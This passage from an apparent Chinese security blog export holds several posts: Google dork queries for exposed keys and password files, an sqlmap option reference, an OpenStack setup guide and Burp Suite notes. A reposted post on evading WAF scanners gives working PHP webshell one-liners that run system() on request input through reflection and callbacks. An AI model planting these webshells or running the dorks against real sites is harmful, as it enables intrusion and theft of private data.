inurl:private 机密的目录和文件 “index of” inbox.dbx“To parent directory” inurl:”Identities” 私人信件/邮件 “session start” “session ident” thomas ext:txt 聊天日志 -“public | pubring | pubkeysignature | pgp | and | or |release” ext:gpg-intext:”and” (ext:enc | ext:axx)“ciphervalue” ext:xml 经过加密的消息 “Begin (DSA | RSA)” ext:key、“index of” “secring.gpg” 搜索隐私的密码 “index of” slave_datatrans OR from_master 搜索密钥 “create table” insert into” “pass|passwd|password” (ext:sql | ext:dump | ext:txt)、“your password * is” (ext:csv | ext.doc | ext:txt) 搜索用户名和密码 inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin 查找可以未经授权就可以访问的phpMyAdmin的后台页面 “OpenSSL” AND “1.0.1 Server at” OR “1.0.1a Server at” OR “1.0.1b Server at” OR “1.0.1c Server at” OR “1.0.1d Server at” OR “1.0.1e Server at” OR “1.0.1f Server at” 其他扩展在使用搜索语法的同时也可以收集一些此类网址，对于找东西的帮助可是很大的呢 搜索百度盘:天天云搜: http://so.ygyhg.com呆木瓜: http://md5.daimugua.com钟馗之眼: https://www.zoomeye.orgshoudan: https://www.shodan.ioSeeBug: https://www.seebug.org雅虎: https://sg.search.yahoo.com必应国际版https://www.bing.comMAEZWhttps://so.mezw.com 其他小众搜索引擎:https://bird.so/https://search.avira.com/#/https://suche.gmx.net/webhttps://r0.ru/https://www.yandex.com/https://search.avira.com/https://www.qwant.comhttps://www.ecosia.org/ 网盘搜索去转盘http://www.quzhuanpan.com/胖次搜索http://www.panc.cc鸵鸟http://www.tuoniao.me/盘搜http://www.pansou.com007http://wangpan007.com百度盘http://sobaidupan.com盘多多http://www.panduoduo.net/西林街http://www.xilinjie.com/小不点https://www.xiaoso.net 磁力资源^.^https://btso.pw/search/https://a8bt.cc/http://www.btcherry.info/https://rarbg.is/torrents.phphttp://storebt.cc/https://idope.se/https://www.69mag.xyz/ 动漫资源动漫花园http://share.dmhy.org/喵搜https://nyaso.com/外国佬的https://gelbooru.com/D站http://www.dilidili.com/蜜柑计划http://mikanani.me/简单动漫http://www.36dm.com/汐空动漫http://www.xkdmbt.com/漫猫动漫http://www.comicat.org/萌番组https://bangumi.moe/ 电子书搜索引擎forfrigghttp://forfrigg.com/鸠摩搜索https://www.jiumodiary.com/kindlesharehttps://sk.kindleshare.cnhttps://www.owllook.net/ 站点导航虫部落搜索http://search.chongbuluo.com/虫部落资源搜索http://magnet.chongbuluo.com/渗透师http://shentoushi.top/等等,,,,,, 留意(1) 操作符、冒号、关键字之间是没有空格的。(2) 布尔操作符（AND、OR、NOT）和特殊字符（-、+）仍可用作高级操作符查询，但是不能把他们放在冒号之前而把冒号和操作符分开。(3) 高级操作符能够和单独的查询混合使用(4) ALL操作符（以ALL开头的操作符）非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用。(5) 其他更多搜索技巧可参考：https://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text= 参考链接http://baike.so.com/doc/6950859-7173260.htmlhttp://blog.jobbole.com/72211/http://www.nxadmin.com/web/120.html 随时更新，有误之处，欢迎指出，欢迎交流。]]></content>
      <categories>
        <category>神器</category>
      </categories>
      <tags>
        <tag>Search</tag>
        <tag>Google hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap备忘录（1）]]></title>
    <url>%2F2016%2F11%2F05%2F4%2F</url>
    <content type="text"><![CDATA[基础SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具。主要可以用来判断可注入的参数、注入的方式，识别数据库种类，读取数据，命令执行等作用。注入模式：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB测试级别（7级）：0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。默认为1级2、同时显示debug信息。3、同时显示注入的payload。（推荐）4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。&nbsp;详细参数：-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库-current-db 网站当前数据库-users 所有数据库用户-current-user 当前数据库用户-random-agent 构造随机user-agent-passwords 数据库密码-proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）Target（目标）：设置目标URL。-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。&nbsp;Request（请求）：用来指定如何连接到目标URL。-data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URLEnumeration（枚举）：用来列举后端数据库管理系统的信息、表中的结构和数据or 运行构造的sql语句-b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shellOptimization（优化）：用于优化SqlMap的性能-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）Injection（注入）：用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据Detection（检测）：用于指定在SQL盲注时如何解析和比较HTTP响应页面的内容–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页Techniques（技巧）：用于调整具体的SQL注入测试–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹Brute force（蛮力）：被用来运行蛮力检查–common-tables 检查存在共同表–common-columns 检查存在共同列User-defined function injection（用户自定义函数注入）：用来创建用户自定义函数。–udf-inject 注入用户自定义函数–shared-lib=SHLIB 共享库的本地路径File system access（访问文件系统）：用来访问后端数据库管理系统的底层文件系统。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径Operating system access（操作系统访问）：用于访问后端数据库管理系统的底层操作系统。–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径Windows注册表访问：用来访问后端数据库管理系统Windows注册表。–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面Options（选项）：-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）&nbsp;注入姿势：http://www.secbox.cn/hacker/6311.htmlhttp://www.secbox.cn/hacker/3789.htmlhttp://404.so/7309.htmlhttp://www.myhack58.com/Article/html/3/7/2016/80301_2.htmhttp://www.qingpingshan.com/pc/aq/154823.html过狗：http://www.freebuf.com/articles/1000.htmlhttp://www.vuln.cn/2086http://www.360doc.com/content/16/0330/05/7944896_546425071.shtmlhttp://www.myhack58.com/Article/html/2/5/2016/76932.htmhttp://blog.csdn.net/qq_29277155/article/details/51193071]]></content>
      <categories>
        <category>神器</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过狗总结（转）]]></title>
    <url>%2F2016%2F11%2F05%2F5%2F</url>
    <content type="text"><![CDATA[xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站程序进行查杀的主动方式以及当请求者浏览该文件时由WAF软件被动的方式进行查杀。而查杀的原理主要是通过对目标文件的特征与网马规则库进行比对。这种查杀原理有它的局限性，攻击者可以利用脚本语言的特性对已被查杀出来的WebShell进行伪装成类似正常的页面程序从而避开WAF软件的查杀。因为狗的查杀并没有相关资料或文档等。不过，我们仍然可以从狗的查杀中得到部分结论。利用正则表达式这种方法最大的好处就是简单。但是，正则表达式最大的缺点就是其只对关键危险函数进行检查。也就是说，我们将关键函数稍微通过某种方式变换一下，正则表达式无法查杀了。而且，这种方法的误报率也很高。所以，这种方法的查杀效果不是很理想。但是这种方法最大的好处就是简单，速度快。一般在查杀web目录下的图片等文件时使用此种方法。利用PHP代码分析技术这种方法最大的好处是解决了正则查杀误报率过高的问题。在这里，我们可以大致分析一下查杀引擎的工作原理：&nbsp;&nbsp;&nbsp;&nbsp;对PHP文件做预处理，去除掉注释，空格，等没有用的东西我们可以在php中写入以下内容&lt;?php/system(“$_get[‘x’]”); /?&gt;使用和d盾查杀，发现没有查杀出一句话。原来查杀引擎在查杀的时候，会做类似于编译器的优化，去掉一些乱七八糟的东西。也许你会认为代码写在注释里，php的编译器也会做类似优化操作，将其去除。而且，代码在注释里也不可能运行的。所以你可能会认为的查杀方式很正确。既简单又高效，为下一步处理降低了负担。但是其实是不正确的。查阅php manual，在PHP 5 &gt;= 5.1.0, PHP 7 中，php官方提供了一个函数ReflectionClass::getDocComment。简而言之，这个函数最主要的作用是获取php的注释。我们可以通过这个函数获取文档中注释，然后通过php的动态函数调用等xxxx各种方法去执行我们所获取到的代码。&nbsp;&nbsp;&nbsp;&nbsp;对上一步预处理所得到的结果做词法分析。以下代码$a=“system(@$_get[‘x’])”和system(@$_get[‘x’])我们分别去查杀这两个文件。结果显而易见，第一个没有办法去查杀，而第二个一定会被查杀。由此，我们可以得出结论，查杀引擎会对php文件做词法分析，然后只对相关函数调用等再做进一步查杀。而类似于字符串等这样变量，查杀引擎基本上会直接将其舍弃。不再做进一步分析。&nbsp;&nbsp;&nbsp;&nbsp;对上一步结果进行语法分析从这一步开始，查杀引擎开始对相关函数的调用进行语法分析。分析变量作用域，函数参数调用等。再与webshell特征库进行比对，用以确定是否为webshell文件。在查杀引擎中，基本上会对if等条件控制条件直接跳过，直接分析里面的代码。例如下面的例子if (false) { system(‘@$_get[‘x‘]’);}这段代码在php文件进行编译的时候，会对其进行分支优化。也就是说，这段代码因为if语句中为false，属于死码，永远不会运行，所以编译器会将其删除掉。但是换做查杀引擎，会直接查杀并报警。据我猜测，php的控制流程跳转那么多，如果查杀引擎也像编译器那样做分支结构的优化，势必会造成查杀效率的降低。所以没办法，只好不管分支结构，直接查杀。躲避查杀的方法上面大致介绍了两种查杀引擎的办法，虽然比较粗略，但是也给了我们躲避查杀的思路。那就是，想办法隐藏关键的特征码。利用php反射技术反射是在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。也就是说，我们可以利用反射去加载system函数，通过反射去传参。因为在反射中，system这个特征码只不过是字符串，所以我们很容易对其进行加解密等操作去躲开查杀引擎的查杀。过狗例子&lt;?php$func = new ReflectionFunction(“system”);echo $func-&gt;invokeArgs(array(“$_GET[c]”));?&gt;这个安全狗查不到，但是d盾可以查到，而d盾查杀结果是可疑函数调用，基本上等于没查到。下面来一段d盾和都查不到的shell&lt;?phpclass HelloWorld { public function sayHelloTo($name) { $last_line = system($name); return $last_line; }}$a=$_GET[“a”];$reflectionMethod = new ReflectionMethod(‘HelloWorld’, ‘sayHelloTo’);echo $reflectionMethod-&gt;invoke(new HelloWorld(), $a);?&gt;利用反射类中函数的办法去执行危险函数利用php的callback方法自 PHP 5.4 起可用 callable&nbsp;类型指定回调类型 callback。本文档基于同样理由使用 callback&nbsp;类型信息。一些函数如 call_user_func()&nbsp;或 usort()&nbsp;可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。也就是说，callback也可以接受一个字符串变量，并将其作为函数去执行。下面是例子&lt;?php$cb= ‘system’;ob_start($cb);echo $_GET[c];ob_end_flush();?&gt;在php中回调函数有很多，打开php的官方手册，找到支持callback的函数，基本上都可以用来做过狗一句话特征码的变形隐藏在上面的例子中，我们已经成功的将函数调用转换为字符串类型，然后通过反射等方式去执行。但是我们还需要躲避正则匹配等查杀引擎，这里还需要对特征码变形。当然了，这里变形的操作就很多了，例如base64加密，gzip压缩，或者，也可以自己写一段加解密字符串的函数。这里就不详细介绍了。过狗的例子有很多，这里只不过给出思路。php作为一门弱类型的语言，可扩展性，灵活性比java一类等语言强很多。但是过于灵活也会导致很多安全问题。在静态查杀中，很容易躲避查杀，造成漏报等问题。所以在安全狗的博客中，也讲了静态查杀不太靠谱，还是防御好黑客上传shell才是正道，使其没有上传webshell的机会。初次写文章，有些地方可能会有技术上的问题，望大牛斧正批评。也望各路大神交流过狗思路，共同学习进步。参考资料http://blog.safedog.cn/?p=77&nbsp; &nbsp; &nbsp; 一种理想的网站木马防护思路探究http://php.net/manual/zh/language.types.callable.php&nbsp; &nbsp; &nbsp; &nbsp; phpcallbackhttps://secure.php.net/manual/zh/reflectionfunction.invoke.php&nbsp;php &nbsp; 反射https://security.tencent.com/index.php/blog/msg/58&nbsp;TSRC挑战赛： PHP防御绕过挑战实录http://wrox.cn/article/100032494/&nbsp;未知攻焉知防 — Webshell变形技术集锦文／烤土豆啦（简书作者）原文链接：http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenStack云计算平台初体验]]></title>
    <url>%2F2016%2F10%2F30%2F3%2F</url>
    <content type="text"><![CDATA[简介OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目;是IaaS(基础设施即服务)组件，让任何人都可以自行建立和提供云端运算服务。此外，OpenStack也用作建立防火墙内的“私有云”（Private&nbsp;Cloud），提供机构或企业内各部门共享资源。构建思路第一步是设置正确的硬件和网络环境。尽管OpenStack允许在一个单一的平面网络上部署一切，从安全的角度来看并不安全。取决于你所使用的管理程序以及虚拟网络接口，它会允许guest虚拟机嗅探管理流量。建议至少使用两个网络：一个用来管理流量，一个用来进行虚拟机之间的对话。这意味着所有的云计算结点中你需要两个网卡（一个运行实例）和网络管理者。这些应该运行在不同的IP范围中。计算结点和实例的网络也需要支持VLAN标记，因为这是在“项目”之间隔绝流量所使用的机制。一个项目等价于你的亚马逊EC2账户，除了你不能按照你所希望的数目创建和分配之外。每一个项目都有自己的管理员和用户，在既定项目中的所有实例可以彼此通信。通过指派每一个项目自己的VLAN以及内部和外部的IP地址池来执行。一旦硬件和网络设置好，下一步就是确定在哪里部署所有的OpenStack组件。标准部署应有一个控制器和一系列计算结点。控制器运行消息服务器，数据库和其他的组件来编排云，同时计算结点运行实例。但是你也可以分解控制器为地理的部分，从而改善性能，像把MySQL放在不同的物理盒中。对于安全而言，最关键的是确保每一部分都安装在安全的主机上，你只需要将其附加在网络上，让云运转即可。只有两部分需要暴露给外面的世界（即使那只是你的企业网络）：API服务器/Web 控制台（如果开启）和网络管理者。这些服务器需要过硬，你甚至可以使用第三方网络接口来隔离后端管理用户连接产生的流量。操作准备环境: windows系统，openstack云平台（172.17.142.2 cloud.X.X.cn）修改windows系统主机名称&amp;IP地址映射文件：/windows/system32/drivers/etc/hosts追加：172.17.142.2&nbsp;&nbsp;&nbsp;&nbsp;cloud.X.X.cn&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;172.17.143.130&nbsp;&nbsp;controllerip地址172.17.143.130要根据后面绑定控制节点浮动ip来修改。以用户名test，密码test登录云平台https://cloud.X.X.cn。网络管理1、创建网络&nbsp;网络名称：135043204_network&nbsp;网络地址：192.32.4.0/24&nbsp;gateway: 192.32.4.254&nbsp;地址池：192.32.4.10,192.32.4.200&nbsp; DNS：211.71.232.652、创建路由器135043204_router&nbsp; &nbsp; &nbsp;选择外部网络：admin_floating_net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;配置路由器135043204_router，增加接口：选择子网135043204_network安装配置控制节点1、以快照镜像mitaka-controller启动虚拟机；2、实例名称为：135043204_controller，可用域：nova，实例数：1&nbsp; &nbsp; &nbsp;源选实例快照：mitaka-controller&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flavor:4core8gram10gdisk&nbsp;&nbsp; &nbsp; &nbsp;网络先选:135043204_network,再选ext_network（tips：在选择网络时，系统默认为第一个网卡的网 &nbsp; 络建立路由）&nbsp; &nbsp; &nbsp;安全组选：default&nbsp; &nbsp; &nbsp;秘钥对选：创建135043204&nbsp; &nbsp; &nbsp;启动实例。&nbsp; &nbsp; &nbsp;绑定浮动ip（tips根据此浮动ip,修改/windows/system32/drivers/etc/hosts文件中的controller对应的ip.）3、通过浮动ip远程连接controller&nbsp; &nbsp; &nbsp;直接通过Xshell，选择public&nbsp;key认证方法，导入创建的私钥135043204，用户名为：centos连接。&nbsp; &nbsp; &nbsp;连接后，切换到root身份,root密码为huawei&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;-&nbsp; &nbsp; &nbsp;修改/etc/ssh/sshd_config&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快速定位password&nbsp; &nbsp; &nbsp;将PasswordAuthentication&nbsp;no行中的no修改为yes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PasswordAuthentication&nbsp;yes&nbsp; &nbsp; &nbsp;存盘退出。&nbsp; &nbsp; &nbsp;重启sshd服务。&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;sshd&nbsp; &nbsp; &nbsp;服务查看,注意颜色为红色的服务名称。&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl&nbsp; &nbsp; &nbsp;禁用cloud相关服务&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-local&nbsp; &nbsp; &nbsp;主机名查看&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hostname&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat&nbsp;/etc/hostname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;主机名设置&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hostnamectl&nbsp;set-hostname&nbsp;controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat&nbsp;/etc/hostname&nbsp;&nbsp; &nbsp; &nbsp;ip&nbsp;查看&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ip&nbsp;a&nbsp; &nbsp; &nbsp;配置ip&amp;host映射&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/hosts&nbsp; &nbsp; &nbsp;修改controller对应的ip，（tips：compute对应的ip根据计算节点ip来修改。）&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.13&nbsp;controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.15&nbsp;compute&nbsp; &nbsp; &nbsp;配置nosql数据库，修改bind_ip为192.32.4.13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/mongod.conf&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mongod&nbsp; &nbsp; &nbsp;配置mysql数据库,修改bind-address为192.32.4.13&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/my.cnf.d/openstack.cnf&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mariadb&nbsp; &nbsp; &nbsp;重启rabbitmq-server&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;rabbitmq-server&nbsp; &nbsp; &nbsp;配置&nbsp;linuxbridge_agent，配置physical_interface_mappings，local_ip&nbsp;，配置local_ip为192.32.4.13&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;&nbsp; &nbsp; &nbsp;重启neutron-linuxbridge-agent&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent&nbsp; &nbsp; &nbsp;查看日志：&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cat /var/log/neutron/linuxbridge-agent.log&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/dhcp-agent.log&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/server.log&nbsp; &nbsp; &nbsp;重启controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;reboot安装配置计算节点以快照镜像mitaka-compute启动虚拟机；实例名称为：135043204_compute，可用域：nova，实例数：1源选实例快照：mitaka-computeflavor:2core4g_10g网络选:135043204_network,ext_network安全组选：default秘钥对选：135043204单击启动实例。绑定浮动ip。通过浮动ip远程连接compute直接通过Xshell，选择public&nbsp;key认证方法，使用私钥135043204，用户名为：centos连接。连接后，切换到root身份su&nbsp;-修改/etc/ssh/sshd_config快速定位password将PasswordAuthentication&nbsp;no行中的no修改为yesPasswordAuthentication&nbsp;yes存盘退出。重启sshd服务。systemctl&nbsp;restart&nbsp;sshd服务查看systemctl禁用cloud相关服务systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-local主机名查看&nbsp;&nbsp;hostname&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;主机名设置&nbsp;&nbsp;hostnamectl&nbsp;set-hostname&nbsp;compute&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;ip&nbsp;查看&nbsp;&nbsp;ip&nbsp;a配置ip&amp;host映射&nbsp; &nbsp; &nbsp;vi&nbsp;/etc/hosts配置&nbsp;linuxbridge_agent，配置physical_interface_mappings，local_ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local_ip&nbsp;=&nbsp;&nbsp;192.32.4.15重启neutron-linuxbridge-agent&nbsp;&nbsp;&nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent&nbsp;&nbsp;&nbsp;查看日志：&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/linuxbridge-agent.log&nbsp;&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/dhcp-agent.log&nbsp;&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/server.log&nbsp;配置/etc/nova/nova.conf，配置my_ip&nbsp;&nbsp;my_ip&nbsp;=&nbsp;192.32.4.15重新启动openstack-nova-computesystemctl restart openstack-nova-compute&nbsp;reboot测试1、以管理员身份登录http://controller/dashboarddomain:defaultuser name:adminpassword:ADMIN_PASS创建云主机类型S135043199:1vcpu,64Mram,1g硬盘2、以普通用户身份登录http://controller/dashboarddomain:defaultuser name:demopassword:DEMO_PASS创建2个云主机实例名称:s135043199镜像:cirrosflavor:s135043199network: selfservice3、通过控制台访问创建好的虚拟机s135043199-2用户名cirros、密码cubswin:)测试两台虚拟机的连通性。到此私有云平台就部署并测试成功。&nbsp;安全性建议（–取自百度百科）： MySQL服务器使用指定的用户账户，不是根MySQL管理账户。这个账户和密码将会暴露在每一个云结点上，即使使用基于证书的认证，因此所有结点需要访问这个数据库服务器。 MySQL配置文件中，限制访问服务器，OpenStack用户账户为唯一授权IP地址。 移除任何不需要的OS组件并确保你所设置的服务器只支持通过SSH的基于密钥的登陆。 默认MySQL和RabbitMQ（消息服务器）流量不加密。如果你隔离了管理网络和坚固的主机，这就不应该是一个很糟糕的风险。如果你的云网络易于嗅探（例如，它和其他服务器共享网络），你需要加密流量。你可以使用OpenSSL来进行MySQL 和RabbitMQ处理。）]]></content>
      <categories>
        <category>云相关</category>
      </categories>
      <tags>
        <tag>OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具系列之Burpsuite学习]]></title>
    <url>%2F2016%2F10%2F13%2F2%2F</url>
    <content type="text"><![CDATA[简介描述：Burp Suite 是用于攻击web 应用程序的集成平台。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。具体作用如：HTTP服务端接口测试；HTTP客户端和服务器端通信测试；Cookie统计分析；WEB页面爬取；WEB常用编码和解码；字符串随机性简单分析；差异对比分析。 模块options： 对整个burpsuite管理，可选择记录日志。comparer：对比。从其他模块转入，用words或者bytes做对比。decoder：编码。encode as 编码，decode as 解码。smart decode 自动分析解码。sequencer：分析字符的随机性，如分析cookiereperater：重放intruder：攻击scanner：扫描spider：爬虫proxy：核心target：为spider和scanner模块设置目标 设置分析域，site map 网站结构，图。alerts：为burpsuite报错，输出错误日志 ProxyProxy功能： http代理功能，处理http请求，处理http响应。intercept：拦截history：历史options：设置&gt;&gt;proxy listeners 设置代理 （intercept client request：对客户端的请求做拦截 intercept server responses：对服务端的回复做拦截，默认不做拦截，需自己打勾）response modification：修改返回值match and replace：若发现请求或应答中某些字符符合你设置的字符则可以删除或修改。miscellaneous：其他。intercept： forward：放过，drop 丢弃， intercept is off 不做拦截。history 单击下面方框可设置过滤器。interface： 当本地端口已被占用，使用proxy中的options中的proxy listener更改端口，也可以在proxy listener 